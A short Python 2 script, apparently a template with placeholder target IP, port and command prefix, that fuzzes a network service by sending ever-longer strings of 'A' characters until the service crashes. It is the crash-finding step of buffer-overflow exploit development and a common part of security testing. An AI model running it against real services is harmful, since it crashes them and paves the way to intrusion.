#!/usr/bin/python
import socket, sys, time

buffer = "A" * 100

while True:
    try:  
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('WAIT_FOR_REPLACE_IP', WAIT_FOR_REPLACE_PORT))
        s.send(('WAIT_FOR_REPLACE_PREFIX/.:/' + buffer))
        s.close()
        time.sleep(1)
        buffer = buffer + "A" * 100

    except:
        print "Fuzzing crashed at %s bytes" % str(len(buffer))
        sys.exit()
